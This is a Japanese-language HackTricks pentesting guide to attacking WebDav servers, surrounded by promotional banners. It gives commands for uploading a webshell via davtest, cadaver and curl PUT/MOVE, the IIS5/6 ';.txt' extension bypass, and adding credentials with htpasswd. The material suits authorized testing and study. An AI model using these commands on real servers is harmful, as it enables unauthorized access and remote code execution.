# WebDav

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で**最も進んだ**コミュニティツールによって動力を供給される**ワークフローを簡単に構築し自動化**します。\
今すぐアクセス：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksに広告を掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを**共有する**。

</details>

**WebDavがアクティブなHTTPサーバー**は、おそらくファイルを**更新、削除、移動、コピー**できるサーバーです。**時々**、**有効な資格情報**が必要です（通常はHTTP Basic認証でチェックします）。

ウェブサーバーからサーバーを制御するために、**webshellをアップロードして実行**することを試みるべきです。\
通常、WebDavサーバーに**接続**するには有効な**資格情報**が必要です： [**WebDav bruteforce**](../../generic-methodologies-and-resources/brute-force.md#http-basic-auth) _(Basic認証)_。

他の一般的な設定は、ウェブサーバーによって**実行される**ファイルの**拡張子**を持つファイルの**アップロードを禁止する**ことです。これを**バイパスする方法**を確認する必要があります：

* **実行可能な拡張子**を持つファイルを**アップロード**する（禁止されていないかもしれません）。
* **実行可能な拡張子がない**ファイル（例：.txt）を**アップロード**し、**実行可能な拡張子**を持つファイルに**名前を変更**（移動）してみる。
* **実行可能な拡張子がない**ファイル（例：.txt）を**アップロード**し、**実行可能な拡張子**を持つファイルに**コピー**（移動）してみる。

## DavTest

**Davtest**は**異なる拡張子を持つ複数のファイルをアップロード**し、拡張子が**実行されるかどうかをチェック**します：
```bash
davtest [-auth user:password] -move -sendbd auto -url http://<IP> #Uplaod .txt files and try to move it to other extensions
davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
```
出力サンプル:

![](<../../.gitbook/assets/image (19) (1).png>)

これは **.txt** と **.html 拡張子が実行されている** という意味ではありません。これは、ウェブを通じてこれらのファイルに**アクセスできる**ことを意味します。

## Cadaver

このツールを使用して **WebDav** サーバーに**接続し**、（**アップロード**、**移動**、または**削除**などの）アクションを**手動で**実行できます。
```
cadaver <IP>
```
## PUTリクエスト
```
curl -T 'shell.txt' 'http://$ip'
```
## MOVEリクエスト
```
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で**最も高度な**コミュニティツールを駆使した**ワークフローを簡単に構築し、自動化**します。\
今すぐアクセス：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## IIS5/6 WebDav 脆弱性

この脆弱性は非常に興味深いです。**WebDav**は**.asp**拡張子のファイルの**アップロード**や**名前変更**を**許可しません**。しかし、名前の最後に**";.txt"**を**追加することでバイパス**でき、ファイルは.aspファイルであるかのように**実行されます**（**".html"**を**".txt"**の代わりに**使用することもできますが、**";"を忘れないでください**）。

その後、シェルを".**txt"ファイル**として**アップロードし、".asp;.txt"**ファイルに**コピー/移動**します。ウェブサーバーを通じてそのファイルにアクセスすると、**実行されます**（cadaverは移動アクションが機能しなかったと表示しますが、実際には機能しています）。

![](<../../.gitbook/assets/image (18) (1) (1).png>)

## 資格情報の投稿

WebdavがApacheサーバーを使用していた場合、Apacheで設定されたサイトを確認する必要があります。一般的には：\
_**/etc/apache2/sites-enabled/000-default**_

その中で、次のようなものを見つけることができるかもしれません：
```
ServerAdmin webmaster@localhost
Alias /webdav /var/www/webdav
<Directory /var/www/webdav>
DAV On
AuthType Digest
AuthName "webdav"
AuthUserFile /etc/apache2/users.password
Require valid-user
```
以下に、**webdav** サーバーの有効な**認証情報**が含まれているファイルがあります：
```
/etc/apache2/users.password
```
このタイプのファイルには、**ユーザー名**とパスワードの**ハッシュ**が含まれています。これらは、webdavサーバーがユーザーを認証するために使用している資格情報です。

それらを**クラック**するか、何らかの理由で**webdav**サーバーに**アクセス**したい場合は、**追加**することもできます。
```bash
htpasswd /etc/apache2/users.password <USERNAME> #You will be prompted for the password
```
新しい資格情報が機能しているかどうかを確認するには、次の操作を行います:
```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```
<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
世界で**最も先進的な**コミュニティツールを駆使して、簡単に**ワークフローを構築し自動化する**ために[**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks)を使用します。\
今すぐアクセス：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
